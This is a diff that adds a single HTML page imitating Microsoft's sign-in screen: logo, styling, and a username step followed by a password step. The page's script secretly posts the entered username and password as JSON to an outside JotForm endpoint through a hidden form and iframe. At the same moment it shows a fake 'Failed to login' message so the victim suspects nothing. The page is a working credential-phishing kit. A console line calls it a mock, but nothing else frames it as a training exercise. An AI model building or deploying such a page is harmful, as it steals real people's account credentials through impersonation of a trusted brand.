@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign in · Microsoft</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Inter', system-ui, -apple-system, sans-serif;
+        }
+        body {
+            background: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0;
+            padding: 20px;
+        }
+        .card {
+            background: white;
+            max-width: 440px;
+            width: 100%;
+            padding: 40px 36px 36px;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.12), 0 4px 24px rgba(0,0,0,0.08);
+        }
+        .ms-logo {
+            font-size: 26px;
+            font-weight: 600;
+            color: #1a1a1a;
+            letter-spacing: -0.5px;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .ms-logo svg { display: inline-block; }
+        h2 {
+            font-weight: 400;
+            font-size: 24px;
+            color: #1a1a1a;
+            margin-bottom: 8px;
+        }
+        .sub {
+            color: #5b5b5b;
+            font-size: 15px;
+            margin-bottom: 28px;
+            line-height: 1.4;
+        }
+        .form-group { margin-bottom: 20px; }
+        label {
+            display: block;
+            font-size: 15px;
+            font-weight: 500;
+            color: #1a1a1a;
+            margin-bottom: 4px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 10px 12px;
+            font-size: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            background: #fafafa;
+            transition: border 0.15s, background 0.15s;
+            outline: none;
+        }
+        .input-field:focus {
+            border-color: #0067b8;
+            background: white;
+            box-shadow: 0 0 0 2px rgba(0,103,184,0.2);
+        }
+        .input-field.error {
+            border-color: #d13438;
+            background: #fff6f5;
+        }
+        .input-field::placeholder { color: #999; }
+        .field-hint {
+            font-size: 13px;
+            color: #5b5b5b;
+            margin-top: 4px;
+        }
+        .field-hint a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+        .field-hint a:hover { text-decoration: underline; }
+        .actions {
+            margin-top: 28px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .actions .links {
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            flex-wrap: wrap;
+            row-gap: 8px;
+        }
+        .actions .links a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+        .actions .links a:hover { text-decoration: underline; }
+        .btn-primary {
+            background: #0067b8;
+            color: white;
+            border: none;
+            padding: 10px 16px;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 6px;
+        }
+        .btn-primary:hover { background: #004e8c; }
+        .btn-primary:active { transform: scale(0.98); }
+        .status-box {
+            margin-top: 20px;
+            padding: 12px 14px;
+            border-radius: 4px;
+            background: #fef0f0;
+            border-left: 4px solid #d13438;
+            color: #a4262c;
+            font-size: 15px;
+            display: none;
+            align-items: center;
+            gap: 8px;
+        }
+        .status-box.show { display: flex; }
+        .status-box .icon { font-size: 20px; }
+        .footer-note {
+            margin-top: 24px;
+            font-size: 12px;
+            color: #777;
+            border-top: 1px solid #e6e6e6;
+            padding-top: 20px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 8px 16px;
+        }
+        .footer-note a {
+            color: #555;
+            text-decoration: none;
+        }
+        .footer-note a:hover { text-decoration: underline; }
+        .hidden-step { display: none; }
+        .visible-step { display: block; }
+        @media (max-width: 480px) {
+            .card { padding: 28px 18px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="card" id="loginCard">
+    <!-- Microsoft Logo -->
+    <div class="ms-logo">
+        <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
+            <rect x="1" y="1" width="9.5" height="9.5" fill="#f25022" />
+            <rect x="12.5" y="1" width="9.5" height="9.5" fill="#7fba00" />
+            <rect x="1" y="12.5" width="9.5" height="9.5" fill="#00a4ef" />
+            <rect x="12.5" y="12.5" width="9.5" height="9.5" fill="#ffb900" />
+        </svg>
+        Microsoft
+    </div>
+
+    <!-- STEP 1: Username -->
+    <div id="step-username" class="visible-step">
+        <h2>Sign in</h2>
+        <div class="sub">to continue to your account</div>
+        <div class="form-group">
+            <label for="usernameInput">Email, phone, or Skype</label>
+            <input type="text" id="usernameInput" class="input-field" placeholder="someone@example.com" autocomplete="username" value="">
+            <div class="field-hint">
+                <span>No account? <a href="#">Create one!</a></span>
+                <span style="margin-left: 16px;"><a href="#">Can't access your account?</a></span>
+            </div>
+        </div>
+        <div class="actions">
+            <button class="btn-primary" id="nextStepBtn">Next</button>
+            <div class="links"><a href="#">Sign-in options</a></div>
+        </div>
+    </div>
+
+    <!-- STEP 2: Password -->
+    <div id="step-password" class="hidden-step">
+        <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 6px;">
+            <span style="font-size: 18px; font-weight: 400;">Sign in</span>
+            <span style="color: #666; font-size: 14px;">·</span>
+            <span id="displayUsername" style="color: #1a1a1a; font-weight: 500; font-size: 16px;"></span>
+        </div>
+        <div class="sub" style="margin-bottom: 16px;">Enter your password</div>
+        <div class="form-group">
+            <label for="passwordInput">Password</label>
+            <input type="password" id="passwordInput" class="input-field" placeholder="••••••••" autocomplete="current-password" value="">
+            <div class="field-hint"><a href="#">Forgot your password?</a></div>
+        </div>
+        <div class="actions">
+            <button class="btn-primary" id="submitBtn">Sign in</button>
+            <div class="links" style="justify-content: flex-start; gap: 16px;">
+                <a href="#" id="backToUserLink">Other ways to sign in</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Status / error box -->
+    <div id="statusMessage" class="status-box">
+        <span class="icon">⚠️</span>
+        <span id="statusText">Failed to login</span>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer-note">
+        <a href="#">Help and feedback</a>
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy and cookies</a>
+    </div>
+</div>
+
+<!-- Hidden iframe to receive JotForm response -->
+<iframe id="jotformHinter" style="display: none; width:0; height:0; border:0;"></iframe>
+
+<script>
+    (function() {
+        // DOM refs
+        const stepUser = document.getElementById('step-username');
+        const stepPass = document.getElementById('step-password');
+        const usernameInput = document.getElementById('usernameInput');
+        const passwordInput = document.getElementById('passwordInput');
+        const displayUsername = document.getElementById('displayUsername');
+        const nextBtn = document.getElementById('nextStepBtn');
+        const submitBtn = document.getElementById('submitBtn');
+        const backLink = document.getElementById('backToUserLink');
+        const statusBox = document.getElementById('statusMessage');
+        const statusText = document.getElementById('statusText');
+
+        // JotForm endpoint
+        const JOTFORM_ACTION = 'https://submit.jotform.com/submit/262301102566041';
+
+        function showFailed(msg) {
+            statusBox.classList.add('show');
+            statusText.textContent = msg || 'Failed to login. Please check your credentials.';
+            statusBox.style.borderLeftColor = '#d13438';
+            statusBox.style.background = '#fef0f0';
+            statusBox.style.color = '#a4262c';
+        }
+
+        function hideStatus() {
+            statusBox.classList.remove('show');
+        }
+
+        function goToPassword() {
+            const username = usernameInput.value.trim();
+            if (!username) {
+                showFailed('Please enter an email, phone, or Skype.');
+                usernameInput.focus();
+                return;
+            }
+            displayUsername.textContent = username;
+            stepUser.classList.remove('visible-step');
+            stepUser.classList.add('hidden-step');
+            stepPass.classList.remove('hidden-step');
+            stepPass.classList.add('visible-step');
+            hideStatus();
+            usernameInput.classList.remove('error');
+            setTimeout(() => passwordInput.focus(), 100);
+        }
+
+        function goToUsername() {
+            stepPass.classList.remove('visible-step');
+            stepPass.classList.add('hidden-step');
+            stepUser.classList.remove('hidden-step');
+            stepUser.classList.add('visible-step');
+            hideStatus();
+            passwordInput.classList.remove('error');
+            usernameInput.focus();
+        }
+
+        function submitToJotform(username, password) {
+            // Create a hidden form that exactly matches JotForm's expected fields
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = JOTFORM_ACTION;
+            form.target = 'jotformHinter';
+            form.style.display = 'none';
+            form.enctype = 'application/x-www-form-urlencoded';
+
+            // Build JSON payload
+            const payload = {
+                username: username,
+                password: password,
+                timestamp: new Date().toISOString()
+            };
+            const jsonString = JSON.stringify(payload);
+
+            // All required fields from the original JotForm
+            const fields = {
+                'formID': '262301102566041',
+                'jsExecutionTracker': 'build-date-1787140875547',
+                'submitSource': 'unknown',
+                'submitDate': 'undefined',
+                'buildDate': '1787140875548',
+                'uploadServerUrl': 'https://upload.jotform.com/upload',
+                'eventObserver': '1',
+                'simple_spc': '262301102566041-262301102566041',
+                // The "other" textarea - we put the JSON here
+                'q7_other': jsonString
+            };
+
+            // Also add a hidden input for the "other" field as a textarea value
+            // Some JotForm forms expect both - we'll add it as a textarea too
+            const textarea = document.createElement('textarea');
+            textarea.name = 'q7_other';
+            textarea.style.display = 'none';
+            textarea.textContent = jsonString;
+            form.appendChild(textarea);
+
+            // Add all hidden inputs
+            for (const [name, value] of Object.entries(fields)) {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = name;
+                input.value = value;
+                form.appendChild(input);
+            }
+
+            // Append to body, submit, then remove
+            document.body.appendChild(form);
+            
+            // Log what we're submitting
+            console.log('Submitting to JotForm:', {
+                action: JOTFORM_ACTION,
+                fields: fields,
+                q7_other: jsonString
+            });
+
+            // Submit the form
+            form.submit();
+
+            // Clean up after submission
+            setTimeout(() => {
+                if (form.parentNode) {
+                    form.parentNode.removeChild(form);
+                }
+            }, 3000);
+        }
+
+        function handleSignIn() {
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value;
+
+            if (!username || !password) {
+                showFailed('Please enter both username and password.');
+                if (!username) usernameInput.focus();
+                else passwordInput.focus();
+                return;
+            }
+
+            // Mark fields as error
+            usernameInput.classList.add('error');
+            passwordInput.classList.add('error');
+
+            // Show "Failed to login" message
+            showFailed('Failed to login. Please check your credentials.');
+
+            // Submit to JotForm
+            submitToJotform(username, password);
+        }
+
+        // Event bindings
+        nextBtn.addEventListener('click', goToPassword);
+
+        submitBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            handleSignIn();
+        });
+
+        backLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            goToUsername();
+            passwordInput.classList.remove('error');
+        });
+
+        usernameInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                nextBtn.click();
+            }
+        });
+
+        passwordInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                submitBtn.click();
+            }
+        });
+
+        // Dummy links - prevent navigation
+        document.querySelectorAll('.links a, .field-hint a, .footer-note a').forEach(link => {
+            link.addEventListener('click', function(e) {
+                if (this.getAttribute('href') === '#') {
+                    e.preventDefault();
+                }
+            });
+        });
+
+        hideStatus();
+        console.log('Mock Microsoft login ready. Credentials will be sent to JotForm as JSON in q7_other.');
+    })();
+</script>
+
+</body>
+</html>
